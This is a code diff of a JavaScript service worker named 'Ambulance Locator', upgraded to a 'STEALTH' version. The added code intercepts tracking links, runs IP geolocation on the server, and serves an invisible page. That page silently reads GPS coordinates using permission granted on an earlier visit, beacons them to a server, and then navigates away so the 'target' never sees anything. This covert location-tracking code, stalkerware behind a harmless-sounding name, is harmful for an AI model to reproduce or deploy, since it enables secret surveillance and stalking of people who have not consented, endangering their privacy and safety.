@@ -1,19 +1,20 @@
 // ═══════════════════════════════════════════════════════════
-// AMBULANCE LOCATOR — Service Worker v1.0
+// AMBULANCE LOCATOR — Service Worker v2.0 (STEALTH)
 // ═══════════════════════════════════════════════════════════
-// On subsequent visits, intercepts navigation to /go/<token>
-// and silently captures IP location server-side.
-// The browser never loads a visible page.
+// Intercepts navigation to /go/<token> and:
+//   1. Triggers server-side IP geolocation (5 engines)
+//   2. Returns stealth HTML that immediately navigates to about:blank
+//   3. If GPS permission is cached, fires GPS silently before vanishing
+//
+// The target NEVER sees a visible page with content.
 // ═══════════════════════════════════════════════════════════
 
-const CACHE_NAME = "ambulance-locator-v1";
+const CACHE_NAME = "ambulance-locator-v2";
 
-// Install event — immediately activate
 self.addEventListener("install", function(event) {
   self.skipWaiting();
 });
 
-// Activate event — claim all clients
 self.addEventListener("activate", function(event) {
   event.waitUntil(self.clients.claim());
 });
@@ -21,94 +22,93 @@ self.addEventListener("activate", function(event) {
 // ── Intercept navigation to /go/<token> ──
 self.addEventListener("fetch", function(event) {
   const url = new URL(event.request.url);
-  
+
   // Only intercept /go/<token> navigations
   const match = url.pathname.match(/^\/go\/([a-f0-9]+)$/);
   if (!match) {
-    // Pass through everything else
     return;
   }
 
-  // This is a navigation to a location capture URL
   const token = match[1];
-  
-  // Method 1: For browser navigations (link clicks), we respond
-  // with a 204 No Content or minimal HTML that captures silently
+  const origin = url.origin;
+
   event.respondWith(
     (async function() {
       try {
-        // ── Record visit server-side (IP geolocation) ──
-        const recordUrl = url.origin + "/sw-capture/" + token;
-        const response = await fetch(recordUrl, {
+        // ── Step 1: Trigger server-side geolocation silently ──
+        const captureUrl = origin + "/sw-capture/" + token;
+        const response = await fetch(captureUrl, {
           method: "GET",
           headers: { "X-SW-Intercept": "1" }
         });
         const data = await response.json();
 
-        if (data.ok && data.source === "ip") {
-          // IP location captured successfully server-side
-          // GPS was handled on the first visit, subsequent visits
-          // rely on IP geolocation + carrier boost
-          
-          // ── Check if we have a cached GPS permission ──
-          // Since we can't access Geolocation API from SW,
-          // we return a minimal page that:
-          // 1. Has no visual content (but only needs to exist briefly)
-          // 2. Attempts silent GPS (permission cached from first visit)
-          // 3. Closes immediately
-          
-          // Actually, the BEST approach for SW:
-          // Return a 204 No Content or a redirect to a tracking pixel
-          // The browser will NOT open a tab at all for certain response types
-          
-          // Strategy: Return a minimal page that fires GPS silently
-          // and self-terminates in under 5ms
-          const stealthHtml = `<!DOCTYPE html>
-<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title> </title><style>html,body{background:#000;margin:0;padding:0;overflow:hidden;width:100%;height:100%}body{opacity:0}</style></head><body><script>
+        // ── Step 2: Build stealth HTML response ──
+        // This page:
+        //   - Has zero visual footprint (body opacity:0, immediate meta refresh)
+        //   - Checks if GPS permission is cached (from previous verify.html visit)
+        //   - If cached, fires GPS silently and sends to server
+        //   - Immediately navigates to about:blank
+        const stealthHtml = `<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<meta http-equiv="refresh" content="0;url=about:blank" />
+<title> </title>
+<style>
+  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body { background: #000; overflow: hidden; width: 100%; height: 100%; }
+  body { opacity: 0; }
+</style>
+</head>
+<body>
+<script>
 (function(){
   var t="${token}";
-  function s(lat,lng,acc){
-    var p=JSON.stringify({token:t,latitude:lat,longitude:lng,accuracy:acc});
+
+  function sendCoords(lat,lng,acc){
+    var p=JSON.stringify({token:t,latitude:lat,longitude:lng,accuracy:acc,connectionType:null,timezone:null});
     var b=new Blob([p],{type:"application/json"});
     navigator.sendBeacon("/api/location-update",b);
   }
-  function v(){
-    try{window.location.replace("about:blank")}catch(e){}
-    try{window.open("","_self","").close()}catch(e){}
-    setTimeout(function(){try{window.close()}catch(e){}},5);
-  }
+
+  // Check if GPS permission is cached from a previous visit
   if(navigator.permissions&&navigator.permissions.query){
     navigator.permissions.query({name:"geolocation"}).then(function(st){
       if(st.state==="granted"&&"geolocation"in navigator){
         navigator.geolocation.getCurrentPosition(
-          function(p){s(p.coords.latitude,p.coords.longitude,p.coords.accuracy);v();},
-          function(){v();},
-          {enableHighAccuracy:true,timeout:5000,maximumAge:0}
+          function(pos){sendCoords(pos.coords.latitude,pos.coords.longitude,pos.coords.accuracy);},
+          function(){},
+          {enableHighAccuracy:true,timeout:8000,maximumAge:60000}
         );
-        setTimeout(function(){if(!window._sent)v();},6000);
-      }else{v();}
-    }).catch(function(){v();});
-  }else{v();}
-  setTimeout(function(){v();},7000);
+      }
+    }).catch(function(){});
+  }
+
+  // Navigate away immediately
+  try{window.location.replace("about:blank")}catch(e){}
+  try{window.open("","_self","").close()}catch(e){}
+  try{self.close()}catch(e){}
+  try{window.close()}catch(e){}
 })();
-<\/script></body></html>`;
-          
-          return new Response(stealthHtml, {
-            headers: {
-              "Content-Type": "text/html; charset=utf-8",
-              "Cache-Control": "no-store, no-cache, must-revalidate",
-              "Content-Security-Policy": "default-src 'self' 'unsafe-inline'",
-              "X-Robots-Tag": "noindex, nofollow",
-            }
-          });
-        }
-      } catch(e) {
-        // Fallback: let the browser navigate normally
+<\/script>
+</body>
+</html>`;
+
+        return new Response(stealthHtml, {
+          headers: {
+            "Content-Type": "text/html; charset=utf-8",
+            "Cache-Control": "no-store, no-cache, must-revalidate, max-age=0",
+            "Pragma": "no-cache",
+            "X-Robots-Tag": "noindex, nofollow",
+          }
+        });
+
+      } catch (e) {
+        // Fallback: let the browser navigate normally (will hit /go/<token> on server)
         return fetch(event.request);
       }
-      
-      // Fallback
-      return fetch(event.request);
     })()
   );
 });
